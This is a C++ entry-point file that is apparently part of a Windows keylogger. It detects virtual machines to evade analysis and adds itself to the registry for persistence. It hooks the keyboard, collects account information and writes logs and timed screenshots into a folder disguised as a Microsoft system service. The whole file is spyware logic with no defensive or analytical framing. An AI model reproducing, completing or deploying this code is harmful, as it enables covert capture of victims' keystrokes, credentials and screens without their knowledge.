#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "debug.h"

int main() {
#ifdef DEBUG_BUILD
  std::vector<std::filesystem::path>
	  path = Stream::GetAllFilesInFolder(Stream::GetPath(R"(\Microsoft\SystemService\)"));
  std::string final = Convert::GetFinalFile(path[0].u8string());
  DEBN(final)
#endif

#ifndef DEBUG_BUILD
  if (Sys::CheckForVirtualMachine()) {
	KeyHook::UninstallHook();
	Sys::RemoveFromRegistry();
	KeyHook::KillProcess();
	return 0;
  }
  Sys::AddToRegistry();
  Crypt::GenerateKeys();
  KeyHook::InstallHook();

  Stream::GetAccountInfo(pUserData);

  Stream::MakeDir(Stream::GetPath("\\Microsoft\\SystemService"));
  Stream::MakeFile();

  Stream::WriteLog("[*] BOOT [*]", pUserData->activeProcess, true);

  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"),
						"winpst",
						true,
						120.0f);

  KeyHook::HandleMessage(true);
#endif // DEBUG_BUILD
  return 0;
}


